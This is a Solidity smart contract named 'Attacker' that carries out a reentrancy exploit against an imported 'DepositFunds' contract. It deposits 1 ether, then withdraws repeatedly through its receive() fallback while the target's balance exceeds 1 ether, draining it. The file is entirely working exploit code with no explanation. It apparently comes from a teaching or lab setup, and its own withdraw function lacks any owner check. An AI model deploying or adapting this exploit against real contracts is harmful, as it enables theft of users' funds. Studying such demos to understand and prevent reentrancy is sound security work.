// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./DepositFunds.sol";

contract Attacker{
    //using SafeMathUpgradeable for uint256;
    DepositFunds public depositFunds;
    address public owner;

    constructor(address payable _depositFunds) {
        depositFunds = DepositFunds(_depositFunds);
        owner = msg.sender;
    }

    receive() external payable{
        if(address(depositFunds).balance>1 ether){
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether, "Send the required attack amount");
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }

    function withdraw() public{
        (bool sent, ) = msg.sender.call{value: address(this).balance}("");
        require(sent, "Failed to withdraw Ether");

    }
}


